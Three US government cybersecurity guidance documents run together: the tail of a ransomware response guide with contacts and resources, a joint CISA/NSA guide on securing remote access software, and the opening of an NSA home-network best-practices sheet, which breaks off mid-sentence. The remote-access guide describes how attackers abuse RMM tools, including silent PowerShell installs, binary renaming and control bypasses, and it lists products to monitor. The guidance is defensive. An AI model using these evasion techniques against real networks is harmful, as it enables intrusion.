Local Area Network (VLAN) has been created for recovery purposes, ensure only clean
systems are added.
 20. Document lessons learned from the incident and associated response activities to
inform updates to
and refine
organizational policies, plans, and procedures and guide future
exercises of the same.
 21. Consider sharing lessons learned and relevant indicators of compromise with CISA
or your sector ISAC to benefit others within the community.
Page | 27
TLP:CLEAR
TLP:CLEAR
Contact Information
In responding to any cyber incident, Federal agencies will undertake threat response; asset response;
and intelligence support and related activities.
What You Can Expect:
Specific guidance to help evaluate and remediate ransomware incidents.
Remote assistance to identify the extent of the compromise and recommendations for
appropriate containment and mitigation strategies (dependent on specific ransomware variant).
Phishing email, storage media, log, and malware analysis based on voluntary submission. Fulldisk forensics can be performed on an as-needed basis.
Assistance in conducting a criminal investigation, which may involve collecting incident artifacts,
including system images and malware samples.
Federal Asset Response Contacts
Upon voluntary request, federal asset response includes furnishing technical assistance to affected
entities to protect their assets, mitigate vulnerabilities, and reduce impacts of cyber incidents;
identifying other entities that may be at risk and assessing their risk to the same or similar
vulnerabilities; assessing potential risks to the sector or region, including potential cascading effects,
and developing courses of action to mitigate these risks; facilitating information sharing and operational
coordination with threat response; and providing guidance on how best to utilize Federal resources and
capabilities in a timely, effective manner to speed recovery.
CISA:
cisa.gov/report
Central@cisa.gov or call (888) 282-0870
Cybersecurity Advisor (cisa.gov/cisa-regions): [Enter your local CISA CSA
phone number and email address.]
MS-ISAC:
For SLTTs, email soc@msisac.org or call (866) 787-4722
Federal Threat Response Contacts
Upon voluntary request, or upon notification of partners, federal threat response includes conducting
appropriate law enforcement and national security investigative activity at the affected entity
s site;
collecting evidence and gathering intelligence; providing attribution; linking related incidents;
identifying additional affected entities; identifying threat pursuit and disruption opportunities;
developing and executing courses of action to mitigate the immediate threat; and facilitating
information sharing and operational coordination with asset response.
FBI:
fbi.gov/contact-us/field-offices [Enter your local FBI field office POC
phone number and email address.]
FBI Internet Crime Complaint Center (IC3) at ic3.gov
USSS:
Page | 28
secretservice.gov/contact/field-offices/ [Enter your USSS field office POC
phone number and email address.]
TLP:CLEAR
TLP:CLEAR
Other Federal Response Contacts
NSA:
Cybersecurity Collaboration Center Services and Contact Information
Other Response Contacts
Consider filling out Table 1 for use should your organization become affected by ransomware. Consider
contacting these organizations for mitigation and response assistance or for notification.
Table 1: Response Contacts Information
Response Contacts:
Contact
24x7
Contact
Information
Roles and Responsibilities
IT/IT Security Team 
 Centralized Cyber Incident
Reporting
Departmental or Elected Leaders
State and Local Law Enforcement
Fusion Center
Managed/Security Service Providers
Cyber Insurance
Page | 29
TLP:CLEAR
TLP:CLEAR
RESOURCES
CISA No-Cost Resources
Information sharing with CISA and the MS-ISAC (for SLTT organizations) is bi-directional. This
includes best practices and network defense information regarding ransomware trends and
variants as well as malware that is a precursor to ransomware.
Policy-oriented or technical assessments help organizations understand how they can improve
their defenses to avoid ransomware infection: cisa.gov/cyber-resource-hub.
Assessments include no-cost Vulnerability Scanning.
Cyber exercises evaluate or help develop a cyber incident response plan in the context of a
ransomware incident scenario: cisa.gov/resources-tools/services/cisa-tabletop-exercisepackages.
CISA cybersecurity advisors advise on best practices and connect you with CISA resources to
manage cyber risk.
Cyber Security Evaluation Tool (CSET) guides asset owners and operators through a
systematic process of evaluating operational technology (OT) and IT. CSET includes the
Ransomware Readiness Assessment (RRA), a self-assessment based on a tiered set of
practices to help organizations evaluate how well they are equipped to defend and recover from
a ransomware incident.
Contacts:
SLTT and private sector organizations: CISA.JCDC@cisa.dhs.gov
Ransomware Quick References
StopRansomware.gov
a whole-of-government website that gives ransomware resources and
alerts.
Security Primer 
 Ransomware (MS-ISAC)
outlines opportunistic and strategic ransomware
campaigns, common infection vectors, and best practice recommendations.
Institute for Security + Technology (IST) Blueprint for Ransomware Defense
an action plan for
ransomware mitigation, response, and recovery for small- and medium-sized enterprises.
Additional Resources
NIST: Zero Trust Architecture
CISA: Cloud Security Technical Reference Architecture
CISA: Secure Cloud Business Applications (SCuBA) Project
CISA: Mitigations and Hardening Guidance for MSPs and Small- and Mid-sized Businesses
CISA: Protecting Against Cyber Threats to Managed Service Providers and their Customers
NSA: Mitigating Cloud Vulnerabilities (NSA)
Page | 30
TLP:CLEAR
TLP:CLEAR
DISCLAIMER OF ENDORSEMENT
The information and opinions contained in this document are provided "as is" and without any
warranties or guarantees. Reference herein to any specific commercial products, process, or service by
trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement,
recommendation, or favoring by the United States Government, and this guidance shall not be used for
advertising or product endorsement purposes.
PURPOSE
This document was developed in furtherance of the authors
 cybersecurity missions, including their
responsibilities to identify and disseminate threats, and to develop and issue cybersecurity
specifications and mitigations. This information may be shared broadly to reach all appropriate
stakeholders.
ACKNOWLEDGEMENTS
Microsoft contributed to this joint guide.
Page | 31
TLP:CLEAR
TLP:CLEAR
GUIDE TO
SECURING REMOTE
ACCESS SOFTWARE
Publication: June 6, 2023
Disclaimer: This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information carries minimal or no
foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:CLEAR
information may be distributed without restriction. For more information on the Traffic Light Protocol, see http://www.cisa.gov/tlp/.
GUIDE TO SECURING REMOTE ACCESS SOFTWARE
TLP:CLEAR
TABLE OF CONTENTS
OVERVIEW: REMOTE ACCESS SOFTWARE
MALICIOUS USE OF REMOTE ACCESS SOFTWARE
ASSOCIATED TTPS
DETECTION
RECOMMENDATIONS FOR ALL ORGANIZATIONS
RECOMMENDATIONS FOR MSP AND SAAS CUSTOMERS
...8
RECOMMENDATIONS FOR MSPS AND IT ADMINISTRATORS
RECOMMENDATIONS FOR DEVELOPERS OF
PRODUCTS WITH REMOTE ACCESS CAPABILITIES..
.....9
DISCLAIMER
.................10
ACKNOWLEDGEMENTS
...........
..10
RESOURCES
..................10
REFERENCES
.................
TLP:CLEAR
GUIDE TO SECURING REMOTE ACCESS SOFTWARE
TLP:CLEAR
OVERVIEW: REMOTE ACCESS SOFTWARE
Remote access software and tools comprise a broad array of capabilities used
to maintain and improve IT, operational technology (OT), and industrial control
systems (ICS) services; they allow a proactive and flexible approach for
organizations to remotely oversee networks, computers, and other devices.
Remote access software, including remote administration solutions and remote
monitoring and management (RMM), enables managed service providers
(MSPs), software-as-a-service (SaaS) providers, IT help desks, and other
network administrators to remotely perform several functions, including
gathering data on network and device health, automating maintenance, PC
setup and configuration, remote recovery and backup, and patch management.
Remote access software enables a user to connect to and access a
computer, server, or network remotely.
Remote administration solution is software that grants
network and application access and administrative control to a
device remotely.
Remote monitoring and management is an agent that is
installed on an endpoint to continuously monitor a machine or
system
s health and status, as well as enabling administration
functions.
Legitimate use of remote access software enables efficiency within IT/OT
management
allowing MSPs, IT help desks, and other providers to maintain
multiple networks or devices from a distance. It also serves as a critical
component for many business environments, both small and large
empowering IT, OT, and ICS professionals to troubleshoot issues and play a
significant role in business continuity plans and disaster recovery strategies.
[1] However, many of the beneficial features of remote access software make it
an easy and powerful tool for malicious actors to leverage, thereby rendering
these businesses vulnerable.
This guide, authored by the Cybersecurity and Infrastructure Security Agency
(CISA), National Security Agency (NSA), Federal Bureau of Investigation (FBI),
Multi-State Information Sharing & Analysis Center (MS-ISAC), and Israel
National Cyber Directorate (INCD), with contributions from private sector
partners listed on page 10, provides an overview of common exploitations
and associated tactics, techniques, and procedures (TTPs). It also includes
recommendations to IT/ OT and ICS professionals and organizations on best
practices for using remote capabilities and how to detect and defend
against malicious actors abusing this software.
CISA | NSA | FBI | MS-ISAC | INCD
TLP:CLEAR
GUIDE TO SECURING REMOTE ACCESS SOFTWARE
TLP:CLEAR
MALICIOUS USE OF REMOTE ACCESS SOFTWARE
Remote access software provides IT/OT teams with flexible ways to detect anomalous network or device issues
early on and proactively monitor systems. Cyber threat actors are increasingly co-opting these same tools for easy
and broad access to victim systems. While remote access software is used by organizations for legitimate
purposes, its use is frequently not flagged as malicious by security tools or processes. Malicious actors exploit this
by using remote access software to establish network connections through cloud-hosted infrastructure while
evading detection. This type of intrusion falls into the category of living off the land (LOTL) attacks, where inherently
malicious files, codes, and scripts are unnecessary, and cyber threat actors use tools already present in the
environment to sustain their malicious activity. For additional information and examples of LOTL attacks, see the
joint Cybersecurity Advisory People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade
Detection.
RMM software in particular has significant capabilities to monitor or operate devices and systems as well as attain
heightened permissions, making it an attractive tool for malicious actors to maintain persistence and move
laterally on compromised networks. This enables MSPs or IT help desks to monitor multiple devices and networks
at once, however these same features also make managing multiple intrusions easier for cyber threat actors. In this
way, remote access software has become a common, high-value instrument for cyber threat actors, especially
ransomware groups. Small- and mid-sized businesses rely on MSPs and the use of various types of remote access
software to supplement their own IT, OT, and ICS infrastructures, and scale network environments without having
to develop those capabilities internally. This makes businesses that much more vulnerable to service provider
supply chain compromises, exploitation, or malicious use of remote capabilities.
Remote access software is particularly appealing to threat actors because the software:
Does not always trigger security tools. Remote access software is often used for legitimate purposes, so it
generally blends into the environment and does not trigger antivirus (AV), antimalware, or endpoint
detection and response (EDR) defenses. RMM software is signed with valid code signing certificates issued
by trusted certificate authorities, meaning that it will not appear inherently suspicious to AVs and EDRs.
Often RMM install paths are excluded from EDR inspection.
Does not require extensive capabilities development. Remote access software enables cyber threat
actors to avoid using or developing custom malware, such as remote access trojans (RATs). The way remote
access products are legitimately used by network administrators is similar to how malicious RATs are used
by threat actors. [2]
May allow actors to bypass software management control policies. While a bypass or exclusion can be
required, remote access software also can be downloaded as self-contained, portable executables that
enable actors to bypass both administrative privilege requirements and software management control
policies.
Note: Portable executables launch within the user
s context without installation. Additionally, because
the use of portable executables often does not require administrator privileges, they can allow
execution of other unapproved software, even if risk management controls may be in place to audit or
block the same software
s installation on the network. Threat actors can leverage a portable
executable with local user rights to attack other vulnerable machines within the local intranet or
establish long-term persistent access as a local user service.
Could allow actors to bypass firewall rules. In addition to bypassing software management controls, many
remote management agents use end-to-end encryption. This could allow a threat actor to download files that
would typically be detected and blocked at the firewall.
Can facilitate multiple cyber intrusions. Remote access software enables threat actors to manage multiple
intrusions at once. In addition, initial access brokers may sell network access to many different
cybercriminals, enabling multiple intrusions to the same network, as well as expanding the reach and ability
of these cyber threat actors. If these actors first compromise an MSP, they could gain access to a large
CISA | NSA | FBI | MS-ISAC | INCD
TLP:CLEAR
TLP:CLEAR
GUIDE TO SECURING REMOTE ACCESS SOFTWARE
number of the affected MSP
s customers
 networks and data.
ASSOCIATED TTPS
Cyber threat actors use remote access software for initial access, maintaining persistence, deploying additional
software and tools, lateral movement, and data exfiltration. As such, remote access software
 and RMM in
particular
is often used by cybercriminals in ransomware incidents, and in certain APT campaigns. For an example
of APT usage, see the joint Cybersecurity Advisory Iranian Government- Sponsored Actors Conduct Cyber
Operations Against Global Government and Commercial Networks
Before leveraging remote access software as part of an intrusion, cyber actors may exploit vulnerable software.
This may include exploiting legitimate servers that are then leveraged for malicious purposes. It may also include
general network exploitation activities such as installing or placing remote access client software for persistence.
Threat actors may also obtain legitimate, compromised remote access software credentials that ultimately enable
them to exercise control over remote endpoints associated with the compromised account. Once initial access is
obtained threat actors often use PowerShell or similar command line tools to silently deploy the RMM agent. Often,
threat actors leverage multiple RMM mechanisms at once. Sometimes malicious actors also use RMM software in
concert with commercial penetration testing tools such as Cobalt Strike or remote access malware to enable
multiple, often redundant, forms of access to ensure persistence.
Threat actors use remote access software to perform multiple functions and carry out several commonly
associated TTPs (e.g . credential dumps and escalating privileges.) See Table 1 for common tactics and techniques
mapped to the MITRE ATT&CK
 for Enterprise framework, version 13. Note: For assistance with mapping threat
activity to the MITRE ATT&CK framework, see CISA
s Best Practices for MITRE ATT&CK Mapping Guide and Decider
Tool. MITRE also provides tactics and techniques specific to ICS, which can be found in the ICS Matrix.
Table 1: Common Threat Actor MITRE ATT&CK Tactics and Techniques
RESOURCE DEVELOPMENT
Technique Title
Obtain Capabilities:
Tool
T1588 .002
Threat actors can obtain software capabilities by buying, stealing, or
downloading tools and using them for capabilities other than their intended
use.
INITIAL ACCESS
Technique Title
External Remote
Services
T1133
Threat actors exploit externally-facing remote services, such as virtual
private networks (VPNs), to enable initial access and persistence into a
network from remote locations.
Supply Chain
Compromise
T1195
Threat actors manipulate legitimate RMM software with modified versions.
Phishing
T1566
Threat actors have used phishing campaigns to lead victims to download
legitimate RMM software. For more information, see the joint Cybersecurity
Advisory Protecting Against Malicious Use of Remote Monitoring and
Management Software.
Valid
Accounts
T1078
Threat actors may exploit vulnerable versions of remote access software or
use legitimate, compromised credentials.
Trusted
Relationship
T1199
Threat actors may leverage third party relationships to gain initial access to
intended victims.
CISA | NSA | FBI | MS-ISAC | INCD
TLP:CLEAR
TLP:CLEAR
GUIDE TO SECURING REMOTE ACCESS SOFTWARE
EXECUTION
Technique Title
Command and
Scripting Interpreter:
PowerShell
T1059 .001
Threat actors may use PowerShell to silently deploy remote access
software. Industry has observed PowerShell being used to install RMM
itself.
DEFENSE EVASION
Technique Title
Masquerading
T1036
Industry has observed cyber threat actors renaming a NetSupport binary to
ctfmon.exe.[2]
DISCOVERY
Technique Title
Remote System
Discovery
T1018
Remote access software may allow threat actors to find lists of other
systems on a network that may be used for lateral movement from the
current system.
LATERAL MOVEMENT
Technique Title
Remote Service
Session Hijacking
T1563
Threat actors may exploit existing remote services to move laterally
throughout a network.
Remote Services
T1021
Threat actors may exploit valid accounts to log into a network or service
designed to accept remote connections.
Exploitation of Remote
Services
T1210
Threat actors may exploit remote services to gain unauthorized access to
internal systems to move laterally throughout a network.
COMMAND AND CONTROL
Technique Title
Remote Access
Software
T1219
CISA | NSA | FBI | MS-ISAC | INCD
Threat actors may establish command and control channels using
legitimate remote access software.
TLP:CLEAR
TLP:CLEAR
GUIDE TO SECURING REMOTE ACCESS SOFTWARE
DETECTION
Network administrators and defenders should first establish a security baseline of normal network activity; in other
words, it is critical for network defenders to be thoroughly familiar with a software
s baseline behavior in order to
recognize abnormal behavior and detect anomalous and malicious use. Network defenders should correlate
detected activity with other suspicious behavior to reduce false positives.
The authoring agencies recommend that organizations monitor for unauthorized use of remote access software
using EDR tools. Remote access software cyber threat actors may leverage includes, among others, the following:
ConnectWise Control (formerly ScreenConnect)
Pulseway
Anydesk
RemotePC
Remote Utilities
Kaseya
NetSupport
GoToMyPC
Splashtop
N-Able
Atera
Bomgar
TeamViewer
LogMeIn
Zoho Assist
Remote access software geared toward OT networks includes, among others, the following:
BeyondTrust (Bomgar)
Claroty
PCAnywhere
Xage
XONA Systems
Zscaler
REPORTING
U.S. organizations: To report suspicious or criminal activity related to information found in this joint guidance,
contact your local FBI field office at fbi.gov/contact-us/field-offices or report the incident to the FBI Internet
Crime Complaint Center (IC3) at ic3.gov. When available, please include the following information regarding the
incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment
used for the activity; the name of the submitting company or organization; and a designated point of contact. To
request incident response resources or technical assistance related to these threats, contact CISA at
Report@cisa.dhs.gov. For NSA cybersecurity report feedback, contact CybersecurityReports@nsa.gov. SLTT
organizations should report incidents to MS-ISAC (866-787-4722 or SOC@cisecurity.org).
Israeli organizations: Contact the CERT-IL center hotline for cyber incident handling by calling 
119,
 24 hours a day, or via
e-mail at 119@cyber.gov.il, or via encrypted e-mail download pgp key. To contact the International Operative Liaison for
CERT-to-CERT engagement, email International@cyber.gov.il.
RECOMMENDATIONS FOR ALL ORGANIZATIONS
The authoring agencies recommend that organizations, specifically MSPs who leverage this software to conduct
regular business, implement the mitigations below to defend against malicious use of remote access software.
Note: These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA
and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and
protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing
cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics,
techniques, and procedures. Visit CISA
s Cross-Sector Cybersecurity Performance Goals for more information on
the CPGs, including additional recommended baseline protections. For additional information, see the related joint
CISA | NSA | FBI | MS-ISAC | INCD
TLP:CLEAR
GUIDE TO SECURING REMOTE ACCESS SOFTWARE
TLP:CLEAR
Cybersecurity Advisory, Protecting Against Malicious Use of Remote Monitoring and Management Software.
ARCHITECTURE, ACCOUNTS, AND POLICY RECOMMENDATIONS
 Maintain a robust risk management strategy based on common standards, such as the National
Institute of Standards and Technology Cybersecurity Framework.
When possible, employ zero trust solutions
or least-privilege-use configuration
which can be
endpoint- or identity-based.
Implement a user training program and phishing exercises to raise users
 awareness of the risks
of visiting suspicious websites, clicking on suspicious links, and opening suspicious attachments
[CPG 2 .I].
See CISA
s Enhance Email & Web Security.
Work with a security operations center (SOC) team that can assist with monitoring systems [CPG 1 .B].
Audit Active Directory for inactive and obsolete accounts or misconfigurations.
Enable just-in-time access and/or two-factor authentication based on the level of risks.
Use safeguards for mass scripting and a script approval process. For example, if an account attempts to
push commands to 10 or more devices within an hour, retrigger security protocols, such as multifactor
authentication (MFA), to ensure the source is legitimate [3]
Use a software bill of materials (SBOM) to maintain an inventory of components within a software
product. For more information on SBOM, see CISA
s Software Bill of Materials (SBOM) | CISA.
Leverage external attack surface management (EASM) to enhance visibility across systems and
infrastructures. EASM provides continuous monitoring to determine unknown assets, provide information
about systems, and aid in compliance by identifying non-compliant technology, missing legal disclaimers,
and expired copyright notices.
HOST-BASED CONTROLS
 Audit remote access software and their configurations on devices on your network to identify
currently used and/or authorized RMM software [CPG 1 .A].
Use security software to detect instances of RMM software only being loaded in memory.
Review logs with complete data, including executing binary, request types, IP addresses, and date/ time,
for execution of remote access software to detect abnormal use of programs running as a portable
executable [CPG 2 .T].
Implement application controls, including zero-trust principles and segmentation, to manage and control
execution of software, including allowlisting RMM programs and limiting actions the software can take [CPG
2 .Q].
Establish a regular frequency for patching, prioritizing software and systems that directly access or are
accessed from the Internet, including remote access and management servers and agents.
NETWORK-BASED CONTROLS
 Implement network segmentation to minimize lateral movement and restrict access to devices, data, and
applications [CPG 2 .F].
See CISA
s Layering Network Security Through Segmentation.
Block both inbound and outbound connections on common RMM ports and protocols at the network
CISA | NSA | FBI | MS-ISAC | INCD
TLP:CLEAR
GUIDE TO SECURING REMOTE ACCESS SOFTWARE
TLP:CLEAR
perimeter and enforce only legitimate use of the tools employing those ports. Remote access software
should have local instances in the environment and avoid operating over HTTPS port 443.
Require authorized RMM solutions only be used from within your network over approved remote access
solutions, such as VPNs or virtual desktop interfaces (VDIs) [CPG 2 .F].
Enable a web application firewall (WAF) to protect remote access software by filtering and
monitoring HTTP traffic [CPG 2 .K].
While this mitigation is valuable, the authoring agencies recommend IT administrators test before
deploying in a production environment, WAFs have been known to disrupt normal operation of
remote access tools.
RECOMMENDATIONS FOR MSP AND SAAS CUSTOMERS
The authoring agencies recommend MSP and SaaS customers:
Ensure that they have a thorough understanding of the security services their administrators are
providing via the contractual arrangement and address any security requirements that fall outside the
scope of the contract. Note: Contracts should detail how and when MSPs and other providers notify the
customer of an incident affecting the customer
s environment.
Enable effective monitoring and logging of their systems. If customers choose to engage an MSP or
SaaS provider to perform monitoring and logging, they should ensure that their contractual
arrangements require their providers to [CPGs 1 .I, 1 .G, 1 .H]:
Implement comprehensive security event management that enables appropriate monitoring and
logging of provider-managed customer systems.
Provide visibility
as specified in the contractual arrangement
to customers of logging activities,
including provider
s presence, activities, and connections to the customer networks Note: Customers
should ensure that MSP accounts are properly monitored and audited.
Notify MSP of confirmed or suspected security events and incidents occurring on the provider
infrastructure and administrative networks and send these to a SOC for analysis and triage.
Keep direct access to log servers
and the ability to delete or alter logs
out of reach of RMM tools.
RECOMMENDATIONS FOR MSPS AND IT ADMINISTRATORS
MSPs and other IT administrators provide services that usually require both trusted network connectivity and
privileged access
or special access beyond that of a standard user-- to and from customer systems. Many
organizations
ranging from large critical infrastructure organizations to small- and mid-sized businesses
MSPs to manage information and communications technology (ICT) systems, store data, or support sensitive
processes. Many organizations make use of MSPs to scale and support network environments and processes
without expanding their internal staff or having to develop the capabilities internally.
Recommended mitigations for initial compromise attack methods include:
Improving the security of vulnerable devices and hardening appliances to vendor best practices. For more
information, see the joint Cybersecurity Information Sheet Selecting and Hardening Remote Access VPN
Solutions.
CISA | NSA | FBI | MS-ISAC | INCD
TLP:CLEAR
TLP:CLEAR
GUIDE TO SECURING REMOTE ACCESS SOFTWARE
Adopting of MFA across all customer services and products [CPG 2 .H]. Note: MSPs should also
implement MFA on all accounts that have access to customer environments and should treat those
accounts as privileged.
Configuring 
reduced privilege
 RMM tools for common uses, like read-only monitoring.
Managing internal architecture risks and segregating internal networks [CPG 2 .F].
While zero trust is the ultimate goal, segregating customer data sets (and services, where applicable)
from each other
as well as from internal company networks
can limit the impact of a single vector of
attack [CPG 2 .F].
Do not reuse admin credentials across multiple customers [CPG 2 .E, 2 .C].
Avoid using end-of-life (EOL) software.
Additionally, when negotiating the terms of a contract with customers, providers should give clear explanations of the
services the customer is purchasing, services the customer is not purchasing, and all contingencies for incident
response and recovery [CPG 1 .G, 1 .H].
RECOMMENDATIONS FOR DEVELOPERS OF PRODUCTS WITH
REMOTE ACCESS CAPABILITIES
The authors recommend providers ensure their products:
Include lower privilege versions and avoid executive/administrative privileges. For example, develop readonly monitoring capabilities where certain accounts can only view information from a system, but cannot
implement changes to a system.
Monitor their software and terms of service violations by cyber threat actors engaging in computer
network intrusions; in particular, free trial versions are often abused by cybercriminal threat actors.
Provide audits and logs that are difficult to delete and remove.
Additionally, the authoring agencies recommend developers:
Incorporate threat modeling into their development processes to identify potential vulnerabilities. During
development, promote fuzzing of command-line interface (CLI) commands and open network interfaces to
detect vulnerabilities.
Map practices to the Secure Software Development Framework (SSDF), which can assist in aligning products
with sound and secure fundamentals, and in turn, help reduce potential vulnerabilities as well as the
possible impact of undetected exploitation.
Use advanced monitoring and incident response capabilities, which help to operationalize OT/ ICS threat
detection and response for cybersecurity teams lacking expertise/infrastructure or budget to deploy full
on-prem OT-specific cyber threat monitoring and management programs.
For more information for developers and manufacturers on building security principles into their products, see the
joint guidance Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Security- by-Design and Default.
CISA | NSA | FBI | MS-ISAC | INCD
TLP:CLEAR
GUIDE TO SECURING REMOTE ACCESS SOFTWARE
TLP:CLEAR
DISCLAIMER
The information in this report is being provided 
as is
 for informational purposes only. CISA, NSA, FBI, MS-ISAC,
and INCD do not endorse any commercial product or service, including any subjects of analysis. Any reference to
specific commercial entities or commercial products, processes, or services by service mark, trademark,
manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoritism by CISA,
NSA, FBI, MS-ISAC, and INCD.
ACKNOWLEDGEMENTS
CNWR, ConnectWise, Corporate Information Technologies, Google, Honeywell, Huntress, (ISC)
 Inc., N-Able, Tenable, and
VMware contributed to this guidance.
RESOURCES
CISA
s Cross-Sector Cybersecurity Performance Goals
CISA Strategic Plan 2023-2025
Protecting Against Malicious Use of Remote Monitoring and Management Software | CISA
Joint CSA Protecting Against Cyber Threats to Managed Service Providers and their Customers
CISA Insights Mitigations and Hardening Guidance for MSPs and Small- and Mid-sized Businesses
Protecting Against Cyber Threats to Managed Service Providers and their Customers | CISA
Joint Guidance Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Security-byDesign and -Default
People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection
 What is RMM (connectwise.com)
What Is Remote Monitoring and Management (RMM)? (intel .com)
Remote monitoring and management abuse - Threat Detection Report (redcanary .com)
REFERENCES
[1] https://www .ninjaone .com/blog/what-is-remote-access-software-guide-2023/
[2] Remote access tool or trojan? How to detect misbehaving RATs (redcanary .com)
[3] https://level .io/blog/how-to-secure-rmms
CISA | NSA | FBI | MS-ISAC | INCD
TLP:CLEAR
TLP:CLEAR
National Security Agency | Cybersecurity Information Sheet
Best Practices for Securing Your Home Network
Executive summary
Don't be a victim! Malicious cyber actors may leverage your home network to gain
access to personal, private, and confidential information. Help protect yourself, your
family, and your work by practicing cybersecurity-aware behaviors, observing some
basic configuration guidelines, and implementing the following mitigations on your home
network, including:
Upgrade and update all equipment and software regularly, including routing
devices
Exercise secure habits by backing up your data and disconnecting devices when
connections are not needed
Limit administration to the internal network only
Figure: Several best practices for securing your home network
U/OO/119184-23 | PP-23-0270 | FEB 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA | Best Practices for Securing Your Home Network
Recommendations for device security
Electronic computing devices, including computers, laptops, printers, mobile phones,
tablets, security cameras, home appliances, cars, and other 
Internet of Things
 (IoT)
devices must all be secured to reduce the risk of compromise. Most home
entertainment and utility devices, such as home monitoring systems, baby monitors, IoT
devices, smart devices, Blu-ray
 players, streaming video players, and video game
consoles, are capable of accessing the Internet, recording audio, and/or capturing
video. Implementing security measures can ensure these devices don
t become the
weak link in your home protection.
Upgrade to a modern operating system and keep it up-to-date
The most recent version of any operating system (OS) contains security features not
found in previous versions. Many of these security features are enabled by default and
help prevent common attack vectors. Increase the difficulty for an adversary to gain
privileged access by using the latest available and supported OS for desktops, laptops,
and smart devices. IoT devices on a home network are often overlooked, but also
require updates. Enable automatic update functionality when available. If automatic
updates are not possible, download and install patches and updates from a trusted
vendor on a monthly basis.
Secure routing devices and keep them up-to-date
Your Internet Service Provider (ISP) may provide a modem/router as part of your
service contract. To maximize administrative control over the routing and wireless
features of your home network, consider using a personally owned routing device that
connects to the ISP-provided modem/router. In addition, use modern router features to
create a separate wireless network for guests, for network separation from your more
trusted and private devices.
Your router is the gateway into your home network. Without proper security and
patching, it is more likely to be compromised, which can lead to the compromise of
other devices on the network as well. To minimize vulnerabilities and improve security,
the routing devices on your home network should be updated to the latest patches,
preferably through automatic updates. These devices should also be replaced when
they reach end-of-life (EOL) for support. This ensures that all devices can continue to
be updated and patched as vulnerabilities are discovered.
U/OO/119184-23 | PP-23-0270 | FEB 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA | Best Practices for Securing Your Home Network
Implement WPA3 or WPA2 on the wireless network
To keep your wireless communications confidential, ensure your personal or ISPprovided WAP is capable of Wi-Fi Protected Access 3 (WPA3). If you have devices on
your network that do not support WPA3, you can select WPA2/3 instead. This allows
newer devices to use the more secure method while still allowing older devices to
connect to the network over WPA2.
When configuring WPA3 or WPA2/3, use a strong passphrase with a minimum length of
twenty characters. When available, protected management frames should also be
enabled for added security. Most computers and mobile devices now support WPA3 or
WPA2. If you are planning to purchase a new device, ensure it is WPA3-Personal
certified. Change the default service set identifier (SSID) to something unique. Do not
hide the SSID as this adds no additional security to the wireless network and may cause
compatibility issues.
Implement wireless network segmentation
Leverage network segmentation on your home network to keep your wireless
communication secure. At a minimum, your wireless network should be segmented
between your primary Wi-Fi, guest Wi-Fi, and IoT network. This segmentation keeps
less secure devices from directly communicating with your more secure devices.
Employ firewall capabilities
Ensure that your personally owned routing device supports basic firewall capabilities.
Verify that it includes network address translation (NAT) to prevent internal systems
from being scanned through the network boundary. Wireless access points (WAP)
generally do not provide these capabilities so it may be necessary to purchase a router.
If your ISP supports IPv6, ensure your router supports IPv6 firewall capabilities.
Leverage security software
Leverage security software that provides layered defense via anti-virus, anti-phishing,
anti-malware, safe browsing, and firewall capabilities. The security suite may be built
into the operating system or available to install as a separate product on computers,
laptops, and tablets. However, some devices, such as home assistants, smart devices,
and other IoT devices, may not support installing security suites. Modern endpoint
detection and response software use cloud-based reputation services for detecting and
U/OO/119184-23 | PP-23-0270 | FEB 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA | Best Practices for Securing Your Home Network
preventing execution of malware. Full disk encryption should be implemented where
possible on laptops, tablets, and mobile phones to prevent data disclosure if that device
is lost or stolen
many mobile devices enable disk encryption by default and security
software can make it as easy as pushing a button.
Protect passwords
Ensure that passwords and answers to challenge questions are properly protected
since they provide access to personal information. Passwords should be strong, unique
for each account, and difficult to guess. Passwords and answers to challenge questions
should not be stored in plain text form on the system or anywhere a malicious actor
might have access. Using a password manager is highly recommended because it
allows you to use unique, complex passwords without needing to remember them.
Limit use of the administrator account
The highly privileged administrator account can access and potentially overwrite all files
and configurations on your system. Because it can access more files, malware can
more effectively compromise your system if it is executed while you are logged on as an
administrator. To prevent this, create a non-privileged 
user
 account for normal,
everyday activities, such as web browsing, email access, and file creation/editing. Only
use the privileged account for maintenance, installations, and updates.
Safeguard against eavesdropping
Be aware that home assistants and smart devices have microphones and are listening
to conversations, even when you are not actively engaging with the device. If
compromised, the adversary can eavesdrop on conversations. Limit sensitive
conversations when you are near baby monitors, audio recording toys, home assistants,
and smart devices. Consider muting their microphones when not in use. For devices
with cameras (e.g., laptops, monitoring devices and toys) cover cameras when you are
not using them. Disconnect Internet access if a device is not commonly used, but be
sure to update it when you do use it.
Exercise secure user habits
To minimize ransomware risks, back up data on external drives or portable media.
Disconnect and securely store external storage when not in use. Minimize charging
mobile devices with computers; use the power adapter instead. Avoid connecting
U/OO/119184-23 | PP-23-0270 | FEB 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA | Best Practices for Securing Your Home Network
devices to public charging stations. Leave computers in sleep mode to enable
downloading and installing updates automatically. Regularly reboot computers to apply
the updates. Turn off devices or disconnect their Internet connections when they will not
be used for an extended time, such as when going on vacation.
Limit administration to the internal network only
Disable the ability to perform remote administration on the routing device. Only make
network configuration changes from within your internal network. Disable Universal
Plug-n-Play (UPnP). These measures help close holes that may enable an attacker to
compromise your network.
Schedule frequent device reboots
To minimize the threat of non-persistent malicious code on your personally owned
device, reboot the device periodically. Malicious implants have been reported to infect
home routers without persistence. At a minimum, you should schedule weekly reboots
of your routing device, smartphones, and computers. Regular reboots help to remove
implants and ensure security. For more guidance on better protecting your smartphone,
refer to the 
Mobile Device Best Practices
 CSI.
Ensure confidentiality during telework
The security of your home network can directly affect not only your personal
